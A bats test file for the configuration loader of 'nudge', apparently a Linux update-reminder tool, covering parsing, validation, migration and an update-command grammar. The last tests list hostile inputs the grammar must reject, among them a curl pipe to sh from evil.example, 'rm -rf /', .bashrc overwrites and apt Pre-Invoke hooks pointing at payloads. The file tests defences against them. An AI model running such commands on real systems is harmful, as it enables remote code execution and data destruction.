#!/usr/bin/env bats
# SPDX-FileCopyrightText: 2026 Jay Taylor (https://github.com/otmof-ops/nudge)
# SPDX-License-Identifier: BSD-3-Clause

bats_require_minimum_version 1.5.0
# Tests for lib/config.sh — load, validate, migrate

setup() {
    TEST_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
    PROJECT_DIR="$(dirname "$TEST_DIR")"
    TMPDIR_TEST=$(mktemp -d)

    # Stub logging functions
    log_debug() { :; }
    log_info()  { :; }
    log_warn()  { :; }
    log_error() { :; }

    source "$PROJECT_DIR/lib/config.sh"
}

teardown() {
    rm -rf "$TMPDIR_TEST"
}

@test "config_load sets defaults when no config file" {
    NUDGE_CONFIG_FILE="$TMPDIR_TEST/nonexistent.conf"
    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/also-nonexistent.conf"
    config_load

    [[ "$ENABLED" == "true" ]]
    [[ "$DELAY" == "45" ]]
    [[ "$SCHEDULE_MODE" == "login" ]]
    [[ "$SNAPSHOT_ENABLED" == "false" ]]
}

@test "config_load parses valid config" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
ENABLED=false
DELAY=120
SCHEDULE_MODE="daily"
NETWORK_HOST="example.com"
EOF

    config_load "$TMPDIR_TEST/test.conf"

    [[ "$ENABLED" == "false" ]]
    [[ "$DELAY" == "120" ]]
    [[ "$SCHEDULE_MODE" == "daily" ]]
    [[ "$NETWORK_HOST" == "example.com" ]]
}

@test "config_load skips comments and blank lines" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
# This is a comment
ENABLED=true

# Another comment
DELAY=30
EOF

    config_load "$TMPDIR_TEST/test.conf"
    [[ "$ENABLED" == "true" ]]
    [[ "$DELAY" == "30" ]]
}

@test "config_load falls back on invalid bool" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
ENABLED=yes
EOF

    config_load "$TMPDIR_TEST/test.conf"
    [[ "$ENABLED" == "true" ]]  # default
}

@test "config_load falls back on invalid int" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
DELAY=abc
EOF

    config_load "$TMPDIR_TEST/test.conf"
    [[ "$DELAY" == "45" ]]  # default
}

@test "config_load falls back on invalid enum" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
SCHEDULE_MODE="hourly"
EOF

    config_load "$TMPDIR_TEST/test.conf"
    [[ "$SCHEDULE_MODE" == "login" ]]  # default
}

@test "config_load ignores unknown keys" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
UNKNOWN_KEY=value
ENABLED=true
EOF

    config_load "$TMPDIR_TEST/test.conf"
    [[ "$ENABLED" == "true" ]]
}

@test "config_load strips quotes from values" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
NETWORK_HOST="1.1.1.1"
UPDATE_COMMAND='sudo apt update'
EOF

    config_load "$TMPDIR_TEST/test.conf"
    [[ "$NETWORK_HOST" == "1.1.1.1" ]]
    [[ "$UPDATE_COMMAND" == "sudo apt update" ]]
}

@test "config_validate passes on defaults" {
    NUDGE_CONFIG_FILE="$TMPDIR_TEST/nonexistent.conf"
    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/also-nonexistent.conf"
    config_load
    config_validate
}

@test "config_validate_value rejects bad bool" {
    run config_validate_value "ENABLED" "yes"
    [[ "$status" -ne 0 ]]
}

@test "config_validate_value accepts valid enum" {
    config_validate_value "SCHEDULE_MODE" "daily"
}

@test "config_validate_value rejects invalid enum" {
    run config_validate_value "SCHEDULE_MODE" "hourly"
    [[ "$status" -ne 0 ]]
}

@test "config_print outputs all keys" {
    NUDGE_CONFIG_FILE="$TMPDIR_TEST/nonexistent.conf"
    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/also-nonexistent.conf"
    config_load

    local output
    output=$(config_print)

    echo "$output" | grep -q "ENABLED"
    echo "$output" | grep -q "DELAY"
    echo "$output" | grep -q "SCHEDULE_MODE"
    echo "$output" | grep -q "SNAPSHOT_ENABLED"
}

@test "config_write creates valid config file" {
    NUDGE_CONFIG_FILE="$TMPDIR_TEST/nonexistent.conf"
    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/also-nonexistent.conf"
    config_load

    local outfile="$TMPDIR_TEST/written.conf"
    config_write "$outfile"

    [[ -f "$outfile" ]]
    grep -q 'CONF_VERSION="2.1.0"' "$outfile"
    grep -q 'ENABLED=true' "$outfile"
    grep -q 'SCHEDULE_MODE="login"' "$outfile"
}

@test "config_load sets BUNNY_PERSONALITY default to disney" {
    NUDGE_CONFIG_FILE="$TMPDIR_TEST/nonexistent.conf"
    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/also-nonexistent.conf"
    config_load
    [[ "$BUNNY_PERSONALITY" == "disney" ]]
}

@test "config_validate_value rejects invalid BUNNY_PERSONALITY" {
    run config_validate_value "BUNNY_PERSONALITY" "thumper"
    [[ "$status" -ne 0 ]]
}

@test "config_migrate creates new config from legacy" {
    # Create legacy config
    cat > "$TMPDIR_TEST/legacy.conf" << 'EOF'
ENABLED=true
DELAY=60
NETWORK_HOST="custom.host.com"
EOF

    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/legacy.conf"
    NUDGE_CONFIG_DIR="$TMPDIR_TEST/nudge"
    NUDGE_CONFIG_FILE="$NUDGE_CONFIG_DIR/nudge.conf"

    config_migrate

    [[ -f "$NUDGE_CONFIG_FILE" ]]
    grep -q 'CONF_VERSION="2.1.0"' "$NUDGE_CONFIG_FILE"
}

# --- The parser accepts what people write ---

@test "config_load accepts spaces around = and an export prefix" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
DELAY = 10
export NETWORK_RETRIES=7
ENABLED =false
EOF
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$DELAY" == "10" ]]
    [[ "$NETWORK_RETRIES" == "7" ]]
    [[ "$ENABLED" == "false" ]]
}

@test "config_load ends an unquoted value at an inline comment" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
ENABLED=false   # off while travelling
DELAY=10 # seconds
NETWORK_HOST="1.1.1.1" # quoted value, comment after
EOF
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$ENABLED" == "false" ]]
    [[ "$DELAY" == "10" ]]
    [[ "$NETWORK_HOST" == "1.1.1.1" ]]
}

@test "config_load tolerates CRLF line endings and a last line without a newline" {
    printf 'DELAY=12\r\nENABLED=false' > "$TMPDIR_TEST/test.conf"
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$DELAY" == "12" ]]
    [[ "$ENABLED" == "false" ]]
}

@test "config_validate fails when config_load had to reject a value" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
DELAY=abc
SCHEDULE_MODE="hourly"
EOF
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$DELAY" == "45" ]]
    run config_validate
    [[ "$status" -ne 0 ]]
    [[ "$output" == *"DELAY"* ]]
    [[ "$output" == *"SCHEDULE_MODE"* ]]
}

@test "integers with leading zeros are rejected" {
    run config_validate_value "NETWORK_RETRIES" "08"
    [[ "$status" -ne 0 ]]
    config_validate_value "NETWORK_RETRIES" "0"
    config_validate_value "DELAY" "120"
}

@test "a config file writable by others is ignored" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
ENABLED=false
EOF
    chmod 666 "$TMPDIR_TEST/test.conf"
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$ENABLED" == "true" ]]
    run config_validate
    [[ "$status" -ne 0 ]]
}

@test "NETWORK_HOST must start and end alphanumeric" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
NETWORK_HOST="-V"
EOF
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$NETWORK_HOST" == "archive.ubuntu.com" ]]
}

@test "DEFERRAL_OPTIONS, TERMINAL_EMULATOR and CRITICAL_PACKAGES_EXTRA are validated" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
DEFERRAL_OPTIONS="30m,1h"
TERMINAL_EMULATOR="/tmp/evil/term"
CRITICAL_PACKAGES_EXTRA="x)$|^(y"
EOF
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$DEFERRAL_OPTIONS" == "1h,4h,1d" ]]
    [[ "$TERMINAL_EMULATOR" == "auto" ]]
    [[ -z "$CRITICAL_PACKAGES_EXTRA" ]]
}

@test "config_write is atomic and private" {
    NUDGE_CONFIG_FILE="$TMPDIR_TEST/nonexistent.conf"
    NUDGE_LEGACY_CONFIG="$TMPDIR_TEST/also-nonexistent.conf"
    config_load
    local outfile="$TMPDIR_TEST/written.conf"
    config_write "$outfile"
    [[ -f "$outfile" ]]
    [[ "$(stat -c %a "$outfile")" == "600" ]]
    [[ -z "$(ls "$TMPDIR_TEST"/written.conf.* 2>/dev/null)" ]]
    grep -q 'SELECT_UPDATES=true' "$outfile"
}

# --- The update command grammar ---

@test "the grammar accepts the shipped commands" {
    config_parse_update_command "sudo apt update && sudo apt full-upgrade"
    config_parse_update_command "sudo dnf upgrade -y"
    config_parse_update_command "sudo pacman -Syu --noconfirm"
    config_parse_update_command "sudo zypper update -y"
    config_parse_update_command "apt-get update && apt-get -y dist-upgrade"
    config_parse_update_command "sudo apt update && sudo apt full-upgrade -y && flatpak update -y"
}

@test "the grammar prints one argument vector per command" {
    run config_parse_update_command "sudo apt update && sudo apt full-upgrade -y"
    [[ "$status" -eq 0 ]]
    [[ "${lines[0]}" == "sudo apt update" ]]
    [[ "${lines[1]}" == "sudo apt full-upgrade -y" ]]
}

@test "the grammar rejects every shell form" {
    local bad
    for bad in \
        'sudo apt update && /tmp/payload' \
        'sudo apt update || /tmp/payload' \
        'sudo apt update &' \
        'sudo apt update && curl -s https://evil.example/x | sh' \
        'sudo true | bash' \
        'sudo -E env PATH=/tmp/evil apt update' \
        'FOO=bar sudo apt update' \
        'sudo sh -c id' \
        'sudo apt update > ~/.bashrc' \
        'sudo apt update >>$HOME/.bashrc' \
        'eval $'"'"'id\nid'"'"'' \
        'x=$(id) && sudo apt update' \
        'sudo apt update; rm -rf /' \
        'yes | sudo apt full-upgrade' \
        '' ; do
        run config_parse_update_command "$bad"
        [[ "$status" -ne 0 ]]
    done
}

@test "the grammar rejects options that point a tool at other code or roots" {
    local bad
    for bad in \
        'sudo apt update -o APT::Update::Pre-Invoke::=/tmp/payload' \
        'sudo apt -oDpkg::Pre-Invoke::=/tmp/x update' \
        'sudo apt-get -c /tmp/apt.conf update' \
        'sudo apt-get --config-file=/tmp/x update' \
        'sudo dnf --setopt=reposdir=/tmp/x upgrade -y' \
        'sudo dnf --installroot=/tmp/x upgrade' \
        'sudo pacman --dbpath /tmp/x -Syu' \
        'sudo zypper --root /tmp/x update' ; do
        run config_parse_update_command "$bad"
        [[ "$status" -ne 0 ]]
    done
}

@test "config_load resets a rejected UPDATE_COMMAND to the default" {
    cat > "$TMPDIR_TEST/test.conf" << 'EOF'
UPDATE_COMMAND="sudo apt update && curl -s https://evil.example/x | sh"
EOF
    config_load "$TMPDIR_TEST/test.conf"
    [[ "$UPDATE_COMMAND" == "sudo apt update && sudo apt full-upgrade" ]]
    run config_validate
    [[ "$status" -ne 0 ]]
}
